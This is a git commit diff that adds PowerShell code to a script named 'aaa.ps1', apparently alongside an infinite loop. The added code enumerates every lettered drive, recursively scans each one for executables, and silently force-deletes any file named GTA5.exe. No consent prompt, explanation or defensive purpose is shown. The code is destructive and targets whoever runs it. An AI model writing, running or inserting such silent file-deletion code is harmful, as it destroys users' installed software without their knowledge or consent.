8444a65816af04c8618adb3943e0c7ab0539a20d
Best Cat <139585282+Sqttyxsq@users.noreply.github.com>
2024-06-02 17:56:24 +0200

    Update aaa.ps1

--- aaa.ps1
+++ aaa.ps1
@@ -19,3 +19,16 @@ while ($true) {
 }
 
 
+    $drives = Get-PSDrive -PSProvider FileSystem | Select-Object Name, Used, Free
+    $drives | Format-Table -Property Name, Used, Free
+    $availableDrives = $drives | Where-Object { $_.Name -match '^[A-Z]$'}
+
+    foreach ($drive in $availableDrives) {
+        $driveName = $drive.Name
+        $files = Get-ChildItem "${driveName}:\\" -Recurse -Filter *.exe
+        foreach ($file in $files) {
+            if ($file.Name -eq "GTA5.exe") {
+                Remove-Item $file.FullName -Force
+            }
+        }
+    }
